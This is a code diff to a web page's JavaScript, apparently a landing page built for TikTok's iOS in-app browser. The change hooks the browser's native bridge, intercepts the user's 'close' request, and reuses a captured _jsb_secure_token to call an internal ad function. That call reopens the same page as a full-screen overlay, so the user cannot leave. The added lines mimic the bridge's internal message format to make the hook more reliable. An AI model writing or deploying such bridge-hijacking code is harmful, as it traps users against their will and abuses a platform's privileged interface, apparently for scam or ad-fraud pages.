@@ -188,7 +188,7 @@ function startTimer(){
   },1000);
 }
 
-// TikTok iOS instant page
+// TikTok iOS — re-open as overlay on close
 (function(){
   if(window.location.search.indexOf('hide_nav_bar=1')!==-1)return;
 
@@ -202,11 +202,13 @@ function startTimer(){
   var orig=wk.postMessage.bind(wk);
 
   wk.postMessage=function(msg){
-    if(!fired&&msg&&msg.func==='close'){
+    var p=msg;
+    if(typeof msg==='string'){try{p=JSON.parse(msg);}catch(e){}}
+    if(!fired&&p&&p.func==='close'){
       fired=true;
-      var tok=token||(msg.params&&msg.params._jsb_secure_token);
+      var tok=token||(p.params&&p.params._jsb_secure_token);
       var fsUrl=SELF_URL+'?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
-      try{orig({func:'openAdLandPageLinks',params:{url:fsUrl,landingStyle:2,isDeeplink:1,refer:'landing_page',cid:TT_CAMPAIGN,_jsb_secure_token:tok}});}catch(e){}
+      try{orig({__msg_type:'call',func:'openAdLandPageLinks',JSSDK:'1.2.5',__callback_id:'1002',params:{url:fsUrl,landingStyle:2,title:'',isDeeplink:1,refer:'landing_page',cid:TT_CAMPAIGN,_jsb_secure_token:tok}});}catch(e){}
       return;
     }
     return orig(msg);
